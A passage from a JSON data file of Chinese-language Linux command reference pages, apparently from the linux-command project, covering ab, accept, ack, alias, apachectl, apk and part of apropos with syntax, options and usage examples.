[
    {
        "title": "ab",
        "des": "Apache服务器的性能测试工具",
        "body": "<h1 id=\"ab\">ab</h1>\n<p>Apache服务器的性能测试工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ab命令</strong> 是一个测试你 Apache http 服务器的工具，你可以通过这个工具，指定一个单位时间内向 apache 发出的请求数量来看看你的 Apache 和机器配合的性能如何。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">ab <span class=\"hljs-comment\">[ -A auth-username:password ]</span> <span class=\"hljs-comment\">[ -c concurrency ]</span> <span class=\"hljs-comment\">[ -C cookie-name=value\n]</span> <span class=\"hljs-comment\">[ -d ]</span> <span class=\"hljs-comment\">[ -e csv-file ]</span> <span class=\"hljs-comment\">[ -g gnuplot-file ]</span> <span class=\"hljs-comment\">[ -h ]</span> <span class=\"hljs-comment\">[ -H custom-header ]</span> <span class=\"hljs-comment\">[\n-i  ]</span>  <span class=\"hljs-comment\">[  -k  ]</span>  <span class=\"hljs-comment\">[  -n  requests  ]</span> <span class=\"hljs-comment\">[ -p POST-file ]</span> <span class=\"hljs-comment\">[ -P proxy-auth-user‐\nname:password ]</span> <span class=\"hljs-comment\">[ -q ]</span> <span class=\"hljs-comment\">[ -s ]</span> <span class=\"hljs-comment\">[ -S ]</span> <span class=\"hljs-comment\">[ -t timelimit ]</span> <span class=\"hljs-comment\">[ -T content-type  ]</span>\n<span class=\"hljs-comment\">[  -v verbosity]</span> <span class=\"hljs-comment\">[ -V ]</span> <span class=\"hljs-comment\">[ -w ]</span> <span class=\"hljs-comment\">[ -x &lt;table&gt;-attributes ]</span> <span class=\"hljs-comment\">[ -X proxy<span class=\"hljs-comment\">[:port]</span>\n]</span>  <span class=\"hljs-comment\">[  -y  &lt;tr&gt;-attributes  ]</span>  <span class=\"hljs-comment\">[  -z   &lt;td&gt;-attributes   ]</span>   <span class=\"hljs-comment\">[http://]</span>host‐\nname<span class=\"hljs-comment\">[:port]</span>/path\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>A auth-username:password\n      <span class=\"hljs-comment\">#  支持基本的验证证书,用户名和密码之间使用\"冒号\"                    :</span>\n      <span class=\"hljs-comment\"># 分隔开,ab将以明文方式传送过去.不管服务器是不是需要</span>\n      <span class=\"hljs-comment\"># ,也就是说你的服务器需要支持401认证.</span>\n\n<span class=\"hljs-literal\">-</span>c concurrency\n      <span class=\"hljs-comment\"># 同时向服务器端发送的请求数目，默认状态下是一次 只执行一个http请求.</span>\n\n<span class=\"hljs-literal\">-</span>C cookie-name=value\n      <span class=\"hljs-comment\"># Add a Cookie: line to the request. The argument is typically in the</span>\n      <span class=\"hljs-comment\"># form of a name=value pair. This field is repeatable.</span>\n\n<span class=\"hljs-literal\">-</span>d    <span class=\"hljs-comment\">#  Do not display  the  \"percentage  served  within  XX  [ms]  table\".</span>\n      <span class=\"hljs-comment\"># (legacy support).</span>\n\n<span class=\"hljs-literal\">-</span>e csv-file\n      <span class=\"hljs-comment\"># Write  a  Comma  separated value (CSV) file which contains for each</span>\n      <span class=\"hljs-comment\"># percentage (from 1% to 100%) the time (in milli seconds) it took to</span>\n      <span class=\"hljs-comment\"># serve  that percentage of the requests. This is usually more useful</span>\n      <span class=\"hljs-comment\"># than the 'gnuplot' file; as the results are already 'binned'.</span>\n\n<span class=\"hljs-literal\">-</span>g gnuplot-file\n      <span class=\"hljs-comment\"># Write all measured values out as a 'gnuplot' or TSV  (Tab  separate</span>\n      <span class=\"hljs-comment\"># values)  file.  This file can easily be imported into packages like</span>\n      <span class=\"hljs-comment\"># Gnuplot, IDL, Mathematica, Igor or even Excell. The labels  are  on</span>\n      <span class=\"hljs-comment\"># the first line of the file.</span>\n<span class=\"hljs-literal\">-</span>h    <span class=\"hljs-comment\"># 显示使用说明</span>\n<span class=\"hljs-literal\">-</span>H custom-header\n      <span class=\"hljs-comment\"># 向请求包追加附加的标题字串.此参数应该是有效的标题         行(header</span>\n      <span class=\"hljs-comment\"># line)形式,通常使用冒号\":\"来分隔有效配对 (valid  pair)例如  'Accept-</span>\n      <span class=\"hljs-comment\"># Encoding: zip/zop;8 bit';</span>\n\n<span class=\"hljs-literal\">-</span>i    <span class=\"hljs-comment\"># 使用一个 http 头(HEAD) 来替换 GET方法.不可以掺入POST 方法</span>\n\n<span class=\"hljs-literal\">-</span>k    <span class=\"hljs-comment\">#  允许http      KeepAlive      ；也就是说执行多个请求在一个      http</span>\n      <span class=\"hljs-comment\"># 会话当中，默认是不允许的也就是no KeepAlive啦;)</span>\n\n<span class=\"hljs-literal\">-</span>n requests\n      <span class=\"hljs-comment\"># 执行一次测试会话的时候所发出的请求数目,默认是执行一个单一的请求</span>\n      <span class=\"hljs-comment\"># 当然了这样的测试结果也就没什么意义了</span>\n\n<span class=\"hljs-literal\">-</span>p POST-file\n      <span class=\"hljs-comment\"># 测试程序也就是ab,将向Apache server发送带有HTTP POST 的请求.</span>\n\n<span class=\"hljs-literal\">-</span>P proxy-auth-username:password\n      <span class=\"hljs-comment\"># 当需要通过代理测试一台 HTTP 服务器的时候而你的代理</span>\n      <span class=\"hljs-comment\"># 又需要用户名密码验证,这时你可以使用这个选项,同样</span>\n      <span class=\"hljs-comment\"># 用户名与密码之间使用冒号\":\"分隔开,ab将之以明文的方式</span>\n      <span class=\"hljs-comment\"># 发送出去,当然,前提是你的代理是处于407认证状态的</span>\n\n<span class=\"hljs-literal\">-</span>q    <span class=\"hljs-comment\">#  When processing more than 150 requests, ab outputs a progress count</span>\n      <span class=\"hljs-comment\"># on  stderr  every  10% or 100 requests or so. The -q flag will sup‐</span>\n      <span class=\"hljs-comment\"># press these messages.</span>\n\n<span class=\"hljs-literal\">-</span>s    <span class=\"hljs-comment\">#  When compiled in (ab -h will show you) use the SSL protected  https</span>\n      <span class=\"hljs-comment\"># rather  than  the  http  protocol. This feature is experimental and</span>\n      <span class=\"hljs-comment\"># very rudimentary. You probably do not want to use it.</span>\n\n<span class=\"hljs-literal\">-</span>S    <span class=\"hljs-comment\">#  Do not display the median and standard deviation values,  nor  dis‐</span>\n      <span class=\"hljs-comment\"># play  the  warning/error  messages  when the average and median are</span>\n      <span class=\"hljs-comment\"># more than one or two times the standard deviation  apart.  And  de‐</span>\n      <span class=\"hljs-comment\"># fault to the min/avg/max values. (legacy support).</span>\n\n<span class=\"hljs-literal\">-</span>t timelimit\n      <span class=\"hljs-comment\">#  设置测试的时间的长短，使用这个选项ab将自动设置</span>\n      <span class=\"hljs-comment\"># 测试请求会话数目为50000，然后以你设置的时间为</span>\n      <span class=\"hljs-comment\"># 固定周期.默认状态下是没有时限的，也就是直到完成</span>\n      <span class=\"hljs-comment\"># 你所设置的请求数目为止.</span>\n\n<span class=\"hljs-literal\">-</span>T content-type\n      <span class=\"hljs-comment\"># 内容类型标头,使用在POST数据的时候.</span>\n\n<span class=\"hljs-literal\">-</span>v verbosity\n      <span class=\"hljs-comment\"># 设置冗余级别,4级打印出每个请求标头的详细信息,</span>\n      <span class=\"hljs-comment\"># 3级打印出回应代码(例如,404,200),2级打印出警告 信息和指示消息</span>\n\n<span class=\"hljs-literal\">-</span>V    <span class=\"hljs-comment\"># 显示版本号并且退出</span>\n<span class=\"hljs-literal\">-</span>w    <span class=\"hljs-comment\"># 打印输出结果到HTML表中. 默认的表是两列n行白底黑框</span>\n\n<span class=\"hljs-literal\">-</span>x &lt;table&gt;-attributes\n      <span class=\"hljs-comment\"># 使用字串来描述表的属性,该属性字串应该插入到&lt;table 这里 &gt;</span>\n\n<span class=\"hljs-literal\">-</span>X proxy[:port]\n      <span class=\"hljs-comment\"># Use a proxy server for the requests.</span>\n\n<span class=\"hljs-literal\">-</span>y &lt;tr&gt;-attributes\n      <span class=\"hljs-comment\"># 用于生成html表格每行的属性名 (&lt;tr&gt;)</span>\n\n<span class=\"hljs-literal\">-</span>z &lt;td&gt;-attributes\n      <span class=\"hljs-comment\"># 用于生成html表格每列的属性名 (&lt;td&gt;)</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>主机：被测试主机。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "accept",
        "des": "指示打印系统接受发往指定目标打印机的打印任务",
        "body": "<h1 id=\"accept\">accept</h1>\n<p>指示打印系统接受发往指定目标打印机的打印任务</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>accept命令</strong> 属于CUPS套件，用于指示打印系统接受发往指定目标打印机的打印任务。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code><span class=\"hljs-function\"><span class=\"hljs-title\">accept</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code><span class=\"hljs-deletion\">-E：当连接到服务器时强制加密；</span>\n<span class=\"hljs-deletion\">-U：指定连接服务器时使用的用户名；</span>\n<span class=\"hljs-deletion\">-h：指定连接服务器名和端口号。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目标：指定目标打印机。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ack",
        "des": "比grep好用的文本搜索工具",
        "body": "<h1 id=\"ack\">ack</h1>\n<p>比grep好用的文本搜索工具</p>\n<h2 id=\"安装\">安装</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># ubuntu下要安装ack-grep，因为在debian系中，ack这个名字被其他的软件占用了。</span>\nsudo apt-get <span class=\"hljs-keyword\">install</span> ack-grep\n<span class=\"hljs-comment\"># alpine Linux-apk软件包管理器 安装 ack</span>\napk <span class=\"hljs-keyword\">install</span> ack\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>这些参数在linux上的适用频率是相当高的，尤其是你用vim做为IDE的话</p>\n<pre><code class=\"language-shell\">-<span class=\"hljs-function\"><span class=\"hljs-title\">c</span>(统计)/ -<span class=\"hljs-title\">i</span>(忽略大小)/ -<span class=\"hljs-title\">h</span>(不显示名称)/\n-<span class=\"hljs-title\">l</span>(只显文件名)/ -<span class=\"hljs-title\">n</span>(加行号)/ -<span class=\"hljs-title\">v</span>(显示不匹配)</span>\n</code></pre>\n<h2 id=\"特点\">特点</h2>\n<p>ack官网列出了这工具的5大卖点：</p>\n<ol>\n<li>速度非常快,因为它只搜索有意义的东西。</li>\n<li>更友好的搜索，忽略那些不是你源码的东西。</li>\n<li>为源代码搜索而设计，用更少的击键完成任务。</li>\n<li>非常轻便，移植性好。</li>\n<li>免费且开源</li>\n</ol>\n<h2 id=\"实例\">实例</h2>\n<p>在记忆的时候大体上可以分为这几个部分：</p>\n<blockquote>\n<p>Searching 代码搜索<br>Search output 搜索结果处理<br>File presentation 文件展示<br>File finding 文件查找<br>File inclusion/exclusion 文件过滤  </p>\n</blockquote>\n<p>grep常用操作</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">grep</span> -r <span class=\"hljs-string\">'hello_world'</span> <span class=\"hljs-comment\"># 简单用法</span>\n<span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">'^hello_world'</span> . <span class=\"hljs-comment\"># 简单正则</span>\nls -l | <span class=\"hljs-keyword\">grep</span> .py <span class=\"hljs-comment\"># 管道用法</span>\n</code></pre>\n<h3 id=\"searching\">Searching</h3>\n<p>简单的文本搜索，默认是递归的。</p>\n<pre><code>ack-<span class=\"hljs-keyword\">grep</span> hello\nack-<span class=\"hljs-keyword\">grep</span> -i hello\nack-<span class=\"hljs-keyword\">grep</span> -v hello\nack-<span class=\"hljs-keyword\">grep</span> -w hello\nack-<span class=\"hljs-keyword\">grep</span> -Q <span class=\"hljs-string\">'hello*'</span>\n</code></pre>\n<h3 id=\"search-file\">Search File</h3>\n<p>对搜索结果进行处理，比如只显示一个文件的一个匹配项，或者xxx</p>\n<pre><code class=\"language-shell\">ack-<span class=\"hljs-keyword\">grep</span> --line=<span class=\"hljs-number\">1</span>       <span class=\"hljs-comment\"># 输出所有文件第二行</span>\nack-<span class=\"hljs-keyword\">grep</span> -l <span class=\"hljs-string\">'hello'</span>     <span class=\"hljs-comment\"># 包含的文件名</span>\nack-<span class=\"hljs-keyword\">grep</span> -L <span class=\"hljs-string\">'print'</span>     <span class=\"hljs-comment\"># 非包含文件名</span>\n</code></pre>\n<h3 id=\"file-presentation\">File presentation</h3>\n<p>输出的结果是以什么方式展示呢，这个部分有几个参数可以练习下</p>\n<pre><code class=\"language-shell\">ack-<span class=\"hljs-keyword\">grep</span> hello --pager=<span class=\"hljs-string\">'less -R'</span>    <span class=\"hljs-comment\"># 以less形式展示</span>\nack-<span class=\"hljs-keyword\">grep</span> hello --noheading      <span class=\"hljs-comment\"># 不在头上显示文件</span>\nack-<span class=\"hljs-keyword\">grep</span> hello --nocolor        <span class=\"hljs-comment\"># 不对匹配字符着色</span>\n</code></pre>\n<h3 id=\"file-finding\">File finding</h3>\n<p>没错，它可以查找文件，以省去你要不断的结合find和grep的麻烦，虽然在linux的思想是一个工具做好一件事。</p>\n<pre><code class=\"language-shell\">ack-<span class=\"hljs-keyword\">grep</span> -f hello.py     <span class=\"hljs-comment\"># 查找全匹配文件</span>\nack-<span class=\"hljs-keyword\">grep</span> -g hello.py$    <span class=\"hljs-comment\"># 查找正则匹配文件</span>\nack-<span class=\"hljs-keyword\">grep</span> -g hello  --<span class=\"hljs-keyword\">sort</span>-files     <span class=\"hljs-comment\"># 查找然后排序</span>\n</code></pre>\n<h3 id=\"file-inclusionexclusion\">File Inclusion/Exclusion</h3>\n<p>文件过滤，个人觉得这是一个很不错的功能。如果你曾经在搜索项目源码是不小心命中日志中的某个关键字的话，你会觉得这个有用。</p>\n<pre><code class=\"language-shell\">ack-<span class=\"hljs-keyword\">grep</span> --<span class=\"hljs-keyword\">python</span> hello       # 查找所有<span class=\"hljs-keyword\">python</span>文件\nack-<span class=\"hljs-keyword\">grep</span> -G hello.<span class=\"hljs-keyword\">py</span>$ hello   # 查找匹配正则的文件\n</code></pre>\n<h2 id=\"参考资料\">参考资料</h2>\n<ul>\n<li><a href=\"https://beyondgrep.com/\">ack官网</a></li>\n</ul>\n"
    },
    {
        "title": "alias",
        "des": "定义或显示别名。",
        "body": "<h1 id=\"alias\">alias</h1>\n<p>定义或显示别名。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">alias <span class=\"hljs-comment\">[-p]</span> <span class=\"hljs-comment\">[name<span class=\"hljs-comment\">[=value]</span> ...]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>简化较长的命令。</li>\n<li>定义一个或多个别名。</li>\n<li>修改一个或多个已定义别名的值。</li>\n<li>显示一个或多个已定义别名。</li>\n<li>显示全部已定义的别名。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\">-<span class=\"hljs-selector-tag\">p</span>：显示全部已定义的别名。\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>name（可选）：指定要（定义、修改、显示）的别名。</p>\n<p>value（可选）：别名的值。</p>\n<h3 id=\"返回值\">返回值</h3>\n<p>alias返回true除非您要显示的别名未定义。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 显示全部已定义的别名</span>\n<span class=\"hljs-keyword\">alias</span>\n<span class=\"hljs-keyword\">alias</span> -p\n\n<span class=\"hljs-comment\"># 显示已定义的别名（假设当前环境存在以下别名）</span>\n<span class=\"hljs-keyword\">alias</span> <span class=\"hljs-keyword\">ls</span>\n<span class=\"hljs-keyword\">alias</span> <span class=\"hljs-keyword\">ls</span> grep\n\n<span class=\"hljs-comment\"># 定义或修改别名的值</span>\n<span class=\"hljs-keyword\">alias</span> <span class=\"hljs-keyword\">ls</span>='<span class=\"hljs-keyword\">ls</span> <span class=\"hljs-params\">--color=auto</span>'\n<span class=\"hljs-keyword\">alias</span> <span class=\"hljs-keyword\">ls</span>='<span class=\"hljs-keyword\">ls</span> <span class=\"hljs-params\">--color=never</span>' grep='grep <span class=\"hljs-params\">--color=never</span>'\n</code></pre>\n<h2 id=\"知识点\">知识点</h2>\n<p>直接在shell里设定的命令别名，在终端关闭或者系统重新启动后都会失效，如何才能永久有效呢？</p>\n<p>使用编辑器打开<code>~/.bashrc</code>，在文件中加入别名设置，如：alias rm='rm -i'，保存后执行<code>source ~/.bashrc</code>，这样就可以永久保存命令的别名了。</p>\n<p>因为修改的是当前用户目录下的<code>~/.bashrc</code>文件，所以这样的方式只对当前用户有用。如果要对所有用户都有效，修改<code>/etc/bashrc</code>文件就可以了。</p>\n<blockquote>\n<p>请注意，以下内容可能与您实际使用的系统有出入:</p>\n<p>在CentOS7下，这个文件是<code>/etc/bash.bashrc</code>。此外在CentOS7下，细看<code>~/.bashrc</code>文件，会发现有这样一段代码：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">if</span> [ -f ~<span class=\"hljs-string\">/.bash_aliases</span> ]; then\n  . ~<span class=\"hljs-string\">/.bash_aliases</span>\nfi\n</code></pre>\n<p>这个代码的意思就是如果存在那么就加载<code>.bash_aliases</code>文件，所以也可以在用户根目录下新建该文件用于单独存放命令别名设置。</p>\n</blockquote>\n<h2 id=\"错误用法\">错误用法</h2>\n<ul>\n<li><p>要显示的别名未定义。</p>\n</li>\n<li><p>当您定义（修改）别名的值的时候，由于值的字符串有空格但您没有用<strong>单引号扩起</strong>，那么会导致严重的问题：</p>\n</li>\n</ul>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># </span><span class=\"language-bash\">为方便演示，删除全部别名</span>\nunalias -a\n<span class=\"hljs-meta\"># </span><span class=\"language-bash\">没有用单引号扩起</span>\nalias rm=rm -rf\n<span class=\"hljs-meta\"># </span><span class=\"language-bash\">执行命令后报错 bash: <span class=\"hljs-built_in\">alias</span>: -rf: not found</span>\n<span class=\"hljs-meta\"># </span><span class=\"language-bash\">这时使用<span class=\"hljs-built_in\">alias</span>查看rm的别名时返回 <span class=\"hljs-built_in\">alias</span> rm=<span class=\"hljs-string\">'rm'</span></span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 更具有迷惑性的例子</span>\n<span class=\"hljs-comment\"># 为方便演示，删除全部别名</span>\n<span class=\"hljs-keyword\">unalias</span> -a\n<span class=\"hljs-comment\"># 仍然没有用单引号括起</span>\n<span class=\"hljs-keyword\">alias</span> <span class=\"hljs-keyword\">ls</span>=<span class=\"hljs-keyword\">ls</span> <span class=\"hljs-params\">--color=never</span>\n<span class=\"hljs-comment\"># 执行命令后看起来没有报错</span>\n\n<span class=\"hljs-comment\"># 使用alias查看全部别名会发现运行结果如下：</span>\n<span class=\"hljs-comment\"># alias --color=never</span>\n<span class=\"hljs-comment\"># alias ls='ls'</span>\n<span class=\"hljs-comment\"># alias处理时将它们看成了两组</span>\n</code></pre>\n<h2 id=\"qa\">Q&amp;A</h2>\n<p>Q：如果我要显示一到多个别名，但不知道其中是否有未定义的该怎么办？</p>\n<p>A：正常执行就是了，alias不会因为有一个未定义的别名就结束对剩余参数的执行。</p>\n<p>Q：如果我这么定义<code>alias cd='ls' ls='cd'</code>，会有什么后果？</p>\n<p>A：运行cd依然会切换目录，运行ls依然会列出文件夹的内容；不要这样定义。</p>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><strong>执行脚本时请注意：</strong></li>\n</ol>\n<blockquote>\n<p>使用<code>source</code>命令执行的bash脚本如果执行了<code>alias</code>或<code>unalias</code>命令，那么有可能会对终端环境的别名设置产生影响；终端环境的别名设置也可能改变运行结果；</p>\n<p>通过<code>sh</code>方式调用的bash脚本或直接运行当前用户有执行权限的脚本不受终端环境的别名影响。</p>\n</blockquote>\n<ol start=\"2\">\n<li><p>删除别名，请查看<code>unalias</code>命令。</p>\n</li>\n<li><p>建议您不要对<code>mv cp rm</code>等命令的别名设置危险的<code>-f</code>选项，比如<code>alias rm='rm -f'</code>。</p>\n</li>\n<li><p>需要注意别名是否和其他命令有冲突的情况。</p>\n</li>\n<li><p>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</p>\n</li>\n</ol>\n<h3 id=\"其他参考链接\">其他参考链接</h3>\n<p><a href=\"https://jingyan.baidu.com/article/ac6a9a5e6738422b653eac01.html\">Linux命令详解：[8]alias创建自己的命令</a></p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "apachectl",
        "des": "Apache服务器前端控制工具",
        "body": "<h1 id=\"apachectl\">apachectl</h1>\n<p>Apache服务器前端控制工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>apachectl命令</strong> 是Apache的Web服务器前端控制工具，用以启动、关闭和重新启动Web服务器进程。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code><span class=\"hljs-function\"><span class=\"hljs-title\">apachectl</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>configtest：检查设置文件中的语法是否正确；</li>\n<li>fullstatus：显示服务器完整的状态信息；</li>\n<li>graceful：重新启动Apache服务器，但不会中断原有的连接；</li>\n<li>help：显示帮助信息；</li>\n<li>restart：重新启动Apache服务器；</li>\n<li>start：启动Apache服务器；</li>\n<li>status：显示服务器摘要的状态信息；</li>\n<li>stop：停止Apache服务器。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "apk",
        "des": "Alpine Linux 下的包管理工具",
        "body": "<h1 id=\"apk\">apk</h1>\n<p>Alpine Linux 下的包管理工具</p>\n<h2 id=\"使用实例\">使用实例</h2>\n<pre><code class=\"language-shell\">apk <span class=\"hljs-keyword\">install </span>xxx\napk search xxx <span class=\"hljs-comment\"># 支持正则</span>\napk info xxx <span class=\"hljs-comment\"># 查看包的详细信息</span>\napk <span class=\"hljs-keyword\">show </span><span class=\"hljs-comment\"># list local package</span>\n<span class=\"hljs-comment\"># 卸载并删除 包</span>\napk del openssh openntp vim\n</code></pre>\n<h3 id=\"升级\">升级</h3>\n<p>upgrade命令升级系统已安装的所以软件包（一般包括内核），当然也可指定仅升级部分软件包（通过-u或–upgrade选择指定）。</p>\n<pre><code class=\"language-shell\">apk update <span class=\"hljs-comment\"># 更新最新本地镜像源</span>\napk upgrade <span class=\"hljs-comment\"># 升级软件</span>\napk <span class=\"hljs-keyword\">add </span>--upgrade <span class=\"hljs-keyword\">busybox </span><span class=\"hljs-comment\"># 指定升级部分软件包</span>\n</code></pre>\n<h3 id=\"搜索\">搜索</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">apk</span> search <span class=\"hljs-comment\"># 查找所以可用软件包</span>\napk search -v <span class=\"hljs-comment\"># 查找所以可用软件包及其描述内容</span>\napk search -v <span class=\"hljs-string\">'acf*'</span> <span class=\"hljs-comment\"># 通过软件包名称查找软件包</span>\napk search -v -d <span class=\"hljs-string\">'docker'</span> <span class=\"hljs-comment\"># 通过描述文件查找特定的软件包</span>\n</code></pre>\n<h3 id=\"查看包信息\">查看包信息</h3>\n<p>info命令用于显示软件包的信息。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">apk</span> <span class=\"hljs-literal\">info</span> <span class=\"hljs-comment\"># 列出所有已安装的软件包</span>\napk <span class=\"hljs-literal\">info</span> -a zlib <span class=\"hljs-comment\"># 显示完整的软件包信息</span>\napk <span class=\"hljs-literal\">info</span> --who-owns /sbin/lbu <span class=\"hljs-comment\"># 显示指定文件属于的包</span>\n</code></pre>\n<h2 id=\"笔记\">笔记</h2>\n<p>还是蛮喜欢 alpine 的，简单纯粹</p>\n<pre><code class=\"language-shell\">apk add iproute2 <span class=\"hljs-comment\"># ss vs netstat</span>\nss -ptl\napk add drill <span class=\"hljs-comment\"># drill vs nslookup&amp;dig</span>\n\ncrond <span class=\"hljs-comment\"># 开启 cron 服务</span>\ncrontab -l -e\n\napk add xxx\napk search -v xxx\napk info -a xxx\napk info\necho -e <span class=\"hljs-string\">\"http://mirrors.aliyun.com/alpine/v3.6/main\\nhttp://mirrors.aliyun.com/alpine/v3.6/community\"</span> &gt; <span class=\"hljs-regexp\">/etc/</span>apk/repositories\napk update\n\n<span class=\"hljs-comment\"># storage</span>\nibu <span class=\"hljs-comment\"># alpine local backup</span>\n\n<span class=\"hljs-comment\"># network</span>\necho <span class=\"hljs-string\">\"shortname\"</span> &gt; <span class=\"hljs-regexp\">/etc/</span>hostname\nhostname -F <span class=\"hljs-regexp\">/etc/</span>hostname\n<span class=\"hljs-regexp\">/etc/</span>hosts\n<span class=\"hljs-regexp\">/etc/</span>resolv.conf <span class=\"hljs-comment\"># conig DNS</span>\nmodprobe ipv6 <span class=\"hljs-comment\"># enable ipv6</span>\necho <span class=\"hljs-string\">\"ipv6\"</span> &gt;&gt; <span class=\"hljs-regexp\">/etc/m</span>odules\niface <span class=\"hljs-comment\"># config interface</span>\napk add iptables ip6tables iptables-doc\n<span class=\"hljs-regexp\">/etc/i</span>nit.d/networking restart <span class=\"hljs-comment\"># activate change</span>\napke add iputils <span class=\"hljs-comment\"># IPv6 traceroute</span>\ntraceroute6 ipv6.google.com\nawall <span class=\"hljs-comment\"># alpine wall</span>\n<span class=\"hljs-comment\"># setup a openvpn server</span>\n\n<span class=\"hljs-comment\"># post-install</span>\n<span class=\"hljs-regexp\">/etc/</span>apk/repositories\napk add cherokee --update-cache --repository http:<span class=\"hljs-regexp\">//</span>dl-<span class=\"hljs-number\">3</span>.alpinelinux.org<span class=\"hljs-regexp\">/alpine/</span>edge<span class=\"hljs-regexp\">/testing/</span> --allow-untrusted\napk search -v --description <span class=\"hljs-string\">'NTP'</span> <span class=\"hljs-comment\"># show description and search from description</span>\napk info -a zlib\napk info -vv|sort\napk info -r -R <span class=\"hljs-comment\"># require / depency</span>\napk version -v -l <span class=\"hljs-string\">'&lt;'</span> <span class=\"hljs-comment\"># show available updates</span>\napk upgrade -U -a\napk add -u xxx <span class=\"hljs-comment\"># update xxx</span>\n\n<span class=\"hljs-regexp\">/etc/</span>runlevels <span class=\"hljs-comment\"># runlevel</span>\napk add openrc <span class=\"hljs-comment\"># use openrc for init system</span>\nrc-update add xxx <span class=\"hljs-comment\"># set to start on</span>\nrc-service xxx start <span class=\"hljs-comment\"># equal -&gt; /etc/init.d/xxx start</span>\nrc-status\n\nadduser xxx\npasswd xxx\n\napk add ansible <span class=\"hljs-comment\"># server</span>\nssh-keygen\n<span class=\"hljs-regexp\">/etc/</span>ansible/hosts\napk add python <span class=\"hljs-comment\"># node</span>\nssh-copy-id\n\napk add man man-pages mdocml-apropos less less-doc\nexport PAGER=less\n<span class=\"hljs-regexp\">/etc/</span>rc.conf <span class=\"hljs-comment\"># /etc/rc.conf -&gt; funny character</span>\napk add bash bash-doc bash-completion <span class=\"hljs-comment\"># bash</span>\napk add util-linux pciutils usbutils coreutils binutils findutils grep <span class=\"hljs-comment\"># grep / awk</span>\napk add build-base gcc abuild binutils binutils-doc gcc-doc <span class=\"hljs-comment\"># compile</span>\napk add cmake cmake-doc extra-cmake-modules extra-cmake-modules-doc\napk add ccache ccache-doc\n\napk add docker <span class=\"hljs-comment\"># docker</span>\nrc-update add docker boot\nrc-service docker start\napk add py-pip\npip install docker-compose\nln -s <span class=\"hljs-regexp\">/usr/</span>bin<span class=\"hljs-regexp\">/docker-compose /u</span>sr<span class=\"hljs-regexp\">/bin/</span>doc\n\n<span class=\"hljs-comment\"># application</span>\napk add openssh <span class=\"hljs-comment\"># ssh</span>\nrc-update add sshd\n<span class=\"hljs-regexp\">/etc/i</span>nit.d/sshd start\n<span class=\"hljs-regexp\">/etc/</span>sshd_config\napk add dropbear <span class=\"hljs-comment\"># another openssh implementation</span>\n</code></pre>\n"
    },
    {
        "title": "apropos",
        "des": "在 whatis 数据库中查找字符串",
        "body": "<h1 id=\"apropos\">apropos</h1>\n<p>在 whatis 数据库中查找字符串</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>apropos命令</strong> 在一些特定的包含系统命令的简短描述的数据库文件里查找关键字，然后把结果送到标准输出。&nbsp;</p>\n<p>如果你不知道完成某个特定任务所需要命令的名称，可以使用一个关键字通过Linux apropos实用程序来搜索它。该实用程序可以搜索关键字并且显示所有包含匹配项的man页面的简短描述。另外，使用man实用程序和-k（关键字）选项，可以得到和用Linux apropos实用程序相同的结果（实际上是相同的命令）。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">apropos [-dalhvV] -e|-[w|-r] [-s section] [-m system[,...]] [-<span class=\"hljs-symbol\">M</span> path] [-<span class=\"hljs-symbol\">L</span> locale] -<span class=\"hljs-symbol\">C</span> [file] keyword ...\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-d, <span class=\"hljs-comment\">--debug：输出调试信息。</span>\n-v, <span class=\"hljs-comment\">--verbose：输出详细的警告信息。</span>\n-r, <span class=\"hljs-comment\">-- regex：将每个keyword作为正则表达式解释。这是默认行为。每个keyword将匹配手册页和描述。</span>\n-w, <span class=\"hljs-comment\">--wildcard：将每个keyword作为shell样式的通配符解释。</span>\n-e, <span class=\"hljs-comment\">--exact：每个keyword将精确匹配手册页名字和描述。</span>\n-<span class=\"hljs-keyword\">a</span>, <span class=\"hljs-comment\">--and：只显示匹配所有keyword的手册页和描述。默认显示匹配任何keyword的项。</span>\n-l, <span class=\"hljs-comment\">--long：不根据终端宽度缩减输出。</span>\n-s section, <span class=\"hljs-comment\">--section section：只查找指定的手册section。</span>\n-m <span 